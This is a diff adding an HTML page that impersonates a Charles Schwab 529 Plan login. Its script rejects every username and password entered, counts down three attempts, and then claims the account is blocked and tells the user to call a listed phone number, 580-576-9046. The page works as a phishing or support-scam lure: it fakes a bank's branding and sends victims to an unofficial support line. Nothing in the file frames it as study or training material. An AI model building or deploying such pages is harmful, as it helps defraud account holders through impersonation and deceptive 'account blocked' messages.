@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Schwab 529 Plan - Login</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f8f8;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 500px;
+            margin: 50px auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .logo {
+            display: block;
+            margin: 0 auto 20px;
+            width: 60px;
+        }
+        .login-box h2 {
+            text-align: center;
+        }
+        .error-box {
+            background: red;
+            color: white;
+            padding: 10px;
+            text-align: center;
+            display: none;
+        }
+        label {
+            display: block;
+            margin-top: 10px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 8px;
+            margin-top: 5px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .remember-me {
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+        }
+        .remember-me input {
+            margin-right: 5px;
+        }
+        .forgot-link {
+            display: block;
+            margin-top: 10px;
+            color: blue;
+            text-decoration: none;
+        }
+        .continue-btn {
+            width: 100%;
+            padding: 10px;
+            margin-top: 15px;
+            background: #0055a4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .info-links {
+            text-align: center;
+            margin-top: 15px;
+        }
+        .info-links a {
+            color: blue;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <img src="logo.png" alt="Charles Schwab Logo" class="logo">
+        </header>
+        <div class="login-box">
+            <h2>Log In to your Schwab 529 Plan account</h2>
+            <div class="error-box" id="error-box">Please specify a user name and password.</div>
+            <form id="login-form">
+                <label for="username">User Name</label>
+                <input type="text" id="username" placeholder="Enter username">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter password">
+                <div class="remember-me">
+                    <input type="checkbox" id="remember">
+                    <label for="remember">Remember my user name</label>
+                </div>
+                <a href="#" class="forgot-link">Forgot user name or password?</a>
+                <button type="submit" class="continue-btn">Continue</button>
+            </form>
+            <div class="info-links">
+                <a href="#">Enroll Now</a> | <a href="#">Create a user name and password</a> | <a href="#">Learn more</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        let loginAttempts = 0;
+        document.getElementById("login-form").addEventListener("submit", function(event) {
+            event.preventDefault();
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            var errorBox = document.getElementById("error-box");
+            
+            if (loginAttempts >= 3) {
+                alert("Your account is blocked. Please contact 580-576-9046 for further support.");
+                return;
+            }
+            
+            if (username.trim() === "" || password.trim() === "") {
+                errorBox.style.display = "block";
+            } else {
+                errorBox.style.display = "none";
+                loginAttempts++;
+                alert("Incorrect ID or Password. Please try again! Attempts left: " + (3 - loginAttempts));
+                
+                if (loginAttempts >= 3) {
+                    alert("Your account is blocked. Please contact 580-576-9046 for further support.");
+                }
+            }
+        });
+    </script>
+</body>
+</html>
